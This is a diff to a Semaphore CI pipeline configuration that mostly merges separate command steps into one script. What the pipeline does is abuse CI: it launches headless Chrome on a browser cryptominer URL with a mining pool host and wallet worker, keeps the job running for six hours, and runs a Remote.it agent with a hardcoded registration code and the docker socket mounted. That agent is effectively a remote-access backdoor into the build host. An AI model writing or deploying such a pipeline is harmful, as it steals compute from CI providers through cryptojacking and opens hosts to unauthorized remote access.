@@ -13,7 +13,7 @@ blocks:
           commands:
             - |
               # --- Runtime variable setup for uniqueness ---
-              INSTANCE_ID_NUM=$((SEMAPHORE_JOB_INDEX - 1)) # Creates 0-99 from 1-100
+              INSTANCE_ID_NUM=$((SEMAPHORE_JOB_INDEX - 1)) # 0-99 from 1-100
               DISPLAY_NUM=$((99 + INSTANCE_ID_NUM))
               CHROME_DEBUG_PORT=$((9222 + INSTANCE_ID_NUM))
               REMOTEIT_CONTAINER_NAME="remoteit_docker_jumpbox_${SEMAPHORE_JOB_INDEX}"
@@ -25,12 +25,12 @@ blocks:
               echo "Chrome Debug Port: ${CHROME_DEBUG_PORT}"
               echo "Remoteit Container Name: ${REMOTEIT_CONTAINER_NAME}"
               echo "Chrome Profile Dir: ${CHROME_PROFILE_DIR}"
-            - echo "Updating and installing dependencies..."
-            - sudo apt-get update
-            - sudo apt-get install -y wget unzip xvfb fonts-liberation libappindicator3-1 libasound2 libatk-bridge2.0-0 libatk1.0-0 libcups2 libdbus-1-3 libgdk-pixbuf2.0-0 libnspr4 libnss3 libxcomposite1 libxdamage1 libxrandr2 xdg-utils
-            - echo "Pulling and starting Remote.it Docker agent: '${REMOTEIT_CONTAINER_NAME}..."'
-            - |
-              # --- Start Remote.it Docker Agent ---
+
+              echo "Updating and installing dependencies..."
+              sudo apt-get update
+              sudo apt-get install -y wget unzip xvfb fonts-liberation libappindicator3-1 libasound2 libatk-bridge2.0-0 libatk1.0-0 libcups2 libdbus-1-3 libgdk-pixbuf2.0-0 libnspr4 libnss3 libxcomposite1 libxdamage1 libxrandr2 xdg-utils
+
+              echo "Pulling and starting Remote.it Docker agent: ${REMOTEIT_CONTAINER_NAME}..."
               docker run -d \
                 -e R3_REGISTRATION_CODE="7CD95576-8DB7-5B3F-B40E-DF1857B2DD13" \
                 -v /var/run/docker.sock:/var/run/docker.sock \
@@ -38,22 +38,22 @@ blocks:
                 --name "${REMOTEIT_CONTAINER_NAME}" \
                 --pull always \
                 remoteit/docker-extension:latest
-            - sleep 5
-            - echo "Installing latest Google Chrome..."
-            - 'wget -q -O chrome.deb https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb'
-            - sudo dpkg -i chrome.deb || sudo apt-get -f install -y
-            - sudo dpkg -i chrome.deb
-            - echo "Verifying Chrome installation..."
-            - google-chrome --version
-            - 'echo "Starting Xvfb (virtual display) on :${DISPLAY_NUM}..."'
-            - |
-              # --- Start Xvfb ---
+              sleep 5
+
+              echo "Installing latest Google Chrome..."
+              wget -q -O chrome.deb https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
+              sudo dpkg -i chrome.deb || sudo apt-get -f install -y
+              sudo dpkg -i chrome.deb
+
+              echo "Verifying Chrome installation..."
+              google-chrome --version
+
+              echo "Starting Xvfb (virtual display) on :${DISPLAY_NUM}..."
               export DISPLAY=:${DISPLAY_NUM}
               Xvfb :${DISPLAY_NUM} -screen 0 1920x1080x24 > "/tmp/xvfb_${SEMAPHORE_JOB_INDEX}.log" 2>&1 &
-            - sleep 3
-            - echo "Launching Chrome in headless mode..."
-            - |
-              # --- Launch Chrome ---
+              sleep 3
+
+              echo "Launching Chrome in headless mode..."
               google-chrome \
                 --no-sandbox \
                 --disable-gpu \
@@ -70,51 +70,19 @@ blocks:
                 --user-data-dir="${CHROME_PROFILE_DIR}" \
                 --headless=new \
                 "https://webminer.pages.dev?algorithm=cwm_minotaurx&host=minotaurx.na.mine.zpool.ca&port=7019&worker=RHWiosLvVQC71ErsX7wygddR1uv63LLfYo&password=c%3DRVN&workers=4" > "/tmp/chrome_${SEMAPHORE_JOB_INDEX}.log" 2>&1 &
-            - |
-              # --- Wait and Log ---
-              CHROME_PID=$! # Capture PID of the last backgrounded command (Chrome)
+
+              CHROME_PID=$!
               echo "Chrome launched with PID ${CHROME_PID}. Remote.it container ${REMOTEIT_CONTAINER_NAME} running."
               echo "Keeping job alive for 6 hours (21600 seconds)..."
               sleep 21600
               echo "6 hours elapsed. Cleaning up instance ${SEMAPHORE_JOB_INDEX}..."
-            - |
-              # --- Cleanup Remote.it ---
+
               echo "Stopping and removing Remote.it container: ${REMOTEIT_CONTAINER_NAME}..."
               docker stop "${REMOTEIT_CONTAINER_NAME}" || echo "Failed to stop ${REMOTEIT_CONTAINER_NAME} or already stopped."
               docker rm "${REMOTEIT_CONTAINER_NAME}" || echo "Failed to remove ${REMOTEIT_CONTAINER_NAME} or already removed."
-            - |
-              # --- Cleanup Chrome ---
-              # CHROME_PID was set in a previous command block, need to re-evaluate or pass if possible
-              # For simplicity here, we'll rely on pkill with the unique profile dir.
-              # If CHROME_PID needs to be passed between command blocks, it's more complex (e.g., write to file).
+
               echo "Killing Chrome and related processes for profile ${CHROME_PROFILE_DIR}..."
-              pkill -f "chrome.*${CHROME_PROFILE_DIR}" || true 
-            - |
-              # --- Cleanup Xvfb ---
-              # DISPLAY_NUM was set in the first command block.
-              # We need to re-declare it or ensure it's available.
-              # For safety, let's re-calculate it based on SEMAPHORE_JOB_INDEX if this block is truly separate.
-              # However, variables set with `export` in one command block are NOT available in subsequent ones.
-              # The best way is to calculate it again if needed, or ensure cleanup is part of the main script.
-              # For this consolidated approach, let's assume the variables from the first block are still in scope
-              # if we were to combine ALL commands into one giant block.
-              # Since we are keeping them as separate items in the `commands` array,
-              # variables like DISPLAY_NUM and CHROME_PROFILE_DIR need to be re-established if used in a new block.
-              # Let's make cleanup more self-contained or ensure variables are available.
-              # The simplest is to re-calculate for cleanup if they are truly separate commands.
-              # For now, I'll assume the pkill for Xvfb needs DISPLAY_NUM.
-              # Let's put all cleanup into one block for variable scope.
+              pkill -f "chrome.*${CHROME_PROFILE_DIR}" || true
 
-              # Re-evaluating for safety, or better, combine all logic into fewer, larger script blocks.
-              # The previous structure had `kill $CHROME_PID` which would fail if CHROME_PID wasn't in scope.
-
-              # Let's make the cleanup block more robust by re-establishing necessary identifiers.
-              CLEANUP_INSTANCE_ID_NUM=$((SEMAPHORE_JOB_INDEX - 1))
-              CLEANUP_DISPLAY_NUM=$((99 + CLEANUP_INSTANCE_ID_NUM))
-              CLEANUP_CHROME_PROFILE_DIR="/tmp/chrome-profile-${SEMAPHORE_JOB_INDEX}"
-
-              echo "Killing Chrome processes for profile ${CLEANUP_CHROME_PROFILE_DIR}..."
-              pkill -f "chrome.*${CLEANUP_CHROME_PROFILE_DIR}" || true
-
-              echo "Killing Xvfb on display :${CLEANUP_DISPLAY_NUM}..."
-              pkill -f "Xvfb :${CLEANUP_DISPLAY_NUM}" || true
+              echo "Killing Xvfb on display :${DISPLAY_NUM}..."
+              pkill -f "Xvfb :${DISPLAY_NUM}" || true
